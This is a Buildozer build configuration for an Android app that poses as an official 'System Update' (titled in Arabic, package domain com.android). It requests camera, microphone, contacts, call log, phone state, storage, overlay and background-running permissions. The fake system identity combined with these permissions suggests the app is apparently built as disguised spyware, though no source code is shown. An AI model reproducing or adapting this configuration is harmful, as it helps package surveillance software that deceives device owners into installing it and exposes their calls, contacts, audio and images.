[app]
title = تحديث النظام
package.name = systemupdate
package.domain = com.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1
requirements = python3,requests
orientation = portrait
fullscreen = 0
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, READ_PHONE_STATE, READ_CONTACTS, READ_CALL_LOG, SYSTEM_ALERT_WINDOW, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
android.api = 30
android.minapi = 21
android.sdk = 30
android.ndk = 28c
android.accept_sdk_license = True
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True
android.debug = True
android.zipalign = True
android.copy_libs = True

[buildozer]
log_level = 2
warn_on_root = 1
